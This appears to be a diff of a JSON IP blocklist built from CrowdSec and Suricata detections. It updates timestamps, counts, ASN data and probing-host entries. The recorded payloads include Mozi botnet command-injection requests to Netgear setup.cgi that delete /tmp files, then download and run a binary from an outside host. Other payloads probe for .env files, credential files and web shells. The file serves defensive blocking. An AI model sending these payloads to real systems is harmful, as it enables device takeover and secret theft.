@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-04-29T13:00:00Z",
+  "generated_at": "2026-04-30T01:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 28,
-    "v4": 28,
+    "total": 27,
+    "v4": 27,
     "v6": 0
   },
   "items": [
@@ -27,78 +27,6 @@
       "asn_prefix": "79.124.40.0/24",
       "payloads": [
         "POST /"
-      ]
-    },
-    {
-      "ip": "199.45.155.83",
-      "family": "v4",
-      "first_seen": "2026-04-23T00:00:00Z",
-      "last_seen": "2026-04-23T00:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "398722",
-      "asn_name": "CENSYS-ARIN-03 - Censys",
-      "asn_prefix": "199.45.155.0/24",
-      "tags": [
-        "mwl:scanner=\"censys\""
-      ]
-    },
-    {
-      "ip": "199.45.154.157",
-      "family": "v4",
-      "first_seen": "2026-04-22T23:00:00Z",
-      "last_seen": "2026-04-22T23:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "398722",
-      "asn_name": "CENSYS-ARIN-03 - Censys",
-      "asn_prefix": "199.45.154.0/24",
-      "tags": [
-        "mwl:scanner=\"censys\""
-      ]
-    },
-    {
-      "ip": "199.45.154.123",
-      "family": "v4",
-      "first_seen": "2026-04-22T22:00:00Z",
-      "last_seen": "2026-04-22T22:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "398722",
-      "asn_name": "CENSYS-ARIN-03 - Censys",
-      "asn_prefix": "199.45.154.0/24",
-      "tags": [
-        "mwl:scanner=\"censys\""
-      ]
-    },
-    {
-      "ip": "199.45.154.125",
-      "family": "v4",
-      "first_seen": "2026-04-22T22:00:00Z",
-      "last_seen": "2026-04-22T22:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "398722",
-      "asn_name": "CENSYS-ARIN-03 - Censys",
-      "asn_prefix": "199.45.154.0/24",
-      "tags": [
-        "mwl:scanner=\"censys\""
       ]
     },
     {
@@ -572,6 +500,9 @@
         "crowdsec",
         "suricata"
       ],
+      "asn": "59257",
+      "asn_name": "CMPAKLIMITED-AS-AP CMPak Limited",
+      "asn_prefix": "223.123.72.0/24",
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://223.123.72.70:38005/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://223.123.72.70:38005/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
@@ -591,6 +522,9 @@
         "crowdsec",
         "suricata"
       ],
+      "asn": "132934",
+      "asn_name": "SKYMAX-AS Skymax Broadband Services Pvt. Ltd.",
+      "asn_prefix": "103.237.156.0/22",
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://103.237.157.160:39938/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.237.157.160:39938/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
@@ -608,6 +542,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "41608",
+      "asn_name": "NextGenWebs-NL NextGenWebs, S.L.",
+      "asn_prefix": "88.151.32.0/22",
       "payloads": [
         "GET /",
         "GET /secrets.json",
@@ -620,6 +557,94 @@
         "GET /.env.backup",
         "GET /laravel/.env",
         "GET /serviceAccountKey.json"
+      ]
+    },
+    {
+      "ip": "65.1.2.171",
+      "family": "v4",
+      "first_seen": "2026-04-30T00:00:00Z",
+      "last_seen": "2026-04-30T00:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:cloud=\"aws\""
+      ],
+      "payloads": [
+        "GET /administrator/.env",
+        "GET /phpinfo.php",
+        "GET /phpinfo",
+        "GET /",
+        "GET /.git/config",
+        "GET /.env",
+        "GET /.env.local",
+        "GET /.env.production",
+        "GET /.env.staging",
+        "GET /.env.development",
+        "GET /.env.test",
+        "GET /.env.remote",
+        "GET /.env.bak",
+        "GET /.env.backup"
+      ]
+    },
+    {
+      "ip": "66.132.195.46",
+      "family": "v4",
+      "first_seen": "2026-04-29T22:00:00Z",
+      "last_seen": "2026-04-29T22:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "payloads": [
+        "GET /debug/pprof/",
+        "GET /metrics"
+      ]
+    },
+    {
+      "ip": "158.158.98.94",
+      "family": "v4",
+      "first_seen": "2026-04-29T15:00:00Z",
+      "last_seen": "2026-04-29T21:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-backdoors-attempts",
+        "crowdsec/http-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /images/index.php",
+        "GET /index.php",
+        "GET /index/function.php",
+        "GET /install.php",
+        "GET /ioxi-o.php",
+        "GET /k.php",
+        "GET /lock360.php",
+        "GET /meta.php",
+        "GET /admin.php",
+        "GET /admin/controller/extension/",
+        "GET /adminfuns.php",
+        "GET /xleet.php",
+        "GET /xmrlpc.php",
+        "GET /1.php",
+        "GET /2.php",
+        "GET /a.php",
+        "GET /aa.php",
+        "GET /aaa.php",
+        "GET /abcd.php",
+        "GET /about.php"
       ]
     }
   ]
